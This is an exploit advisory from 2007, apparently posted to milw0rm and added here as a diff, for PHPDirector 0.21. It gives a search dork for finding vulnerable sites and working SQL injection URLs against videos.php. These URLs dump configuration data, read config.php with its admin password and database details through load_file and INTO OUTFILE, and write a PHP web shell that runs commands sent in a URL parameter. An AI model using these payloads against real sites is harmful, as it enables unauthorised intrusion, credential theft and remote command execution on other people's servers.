@@ -1,0 +1,34 @@
+PHPDirector <= 0.21 (SQL injection/Upload SHELL) Remote Vulnerabilities
+
+WEB APP: PHPDirector 0.21
+SITE: http://www.phpdirector.co.uk/site/
+DORK: "Powered by PHP Director"
+
+AUTHOR: Kw3rLn [ teh_lost_byte[at]YaHoO[d0t]Com ]
+
+* Romanian Security Team [Ethical Hacking] - hTTp://RSTZONE.nET
+
+DESCRIPTION: - SQL injection in $id of videos.php
+             - admin & password are in config.php :-(
+             - Path disclosure
+             - It doesn`t deserve to make an sploit
+
+EXPLOIT:
+
+SQL INJECTION: http://www.site.com/videos.php?id=-1%20UNION%20SELECT%20name,news,vids_per_page,version,template,6,7,8,9,10,11,12,13,14,15%20FROM%20pp_config
+
+FIND ADMIN PASS & DB INFO:
+1. We must have teh path .. check: http://www.site.com/videos.php?id[]= (path disclosure)
+2. http://www.site.com/videos.php?id=-1%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,load_file('[path_you_just_found]/config.php')%20FROM%20pp_config%20into%20outfile%20'[path_you_just_found]/config.txt'
+3. Now check: http://www.site.com/config.txt
+
+UPLOAD SHELL:
+1. We must have teh path .. check: http://www.site.com/videos.php?id[]= (path disclosure)
+2. http://www.site.com/videos.php?id=-1%20UNION%20SELECT%201,'<?php%20system($_GET[cmd]);%20?>',3,4,5,6,7,8,9,10,11,12,13,14,15%20INTO%20OUTFILE%20'[path_founded]/shell.php'%20FROM%20pp_config
+3. http://www.site.com/shell.php?cmd=uname -a
+
+
+GREETZ: all memberz of RST and milw0rm
+//kw3rln [http://rstzone.net]
+
+# milw0rm.com [2007-07-02]
